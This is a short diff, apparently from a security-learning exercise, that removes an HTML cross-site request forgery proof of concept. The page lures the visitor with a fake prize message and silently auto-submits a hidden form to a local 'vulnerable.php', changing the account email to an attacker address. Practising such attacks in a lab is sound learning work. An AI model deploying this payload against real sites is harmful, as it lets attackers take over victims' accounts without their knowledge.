@@ -1,9 +1,0 @@
-<!-- CSRF PoC - Day 9 by Shradha -->
-<h2>You won a prize! Loading...</h2>
-<form action="http://localhost/vulnerable.php" method="POST" id="csrf">
-    <input type="hidden" name="email" value="hacker@evil.com">
-</form>
-<script>
-    // Auto-submit without user knowing
-    document.getElementById('csrf').submit();
-</script>
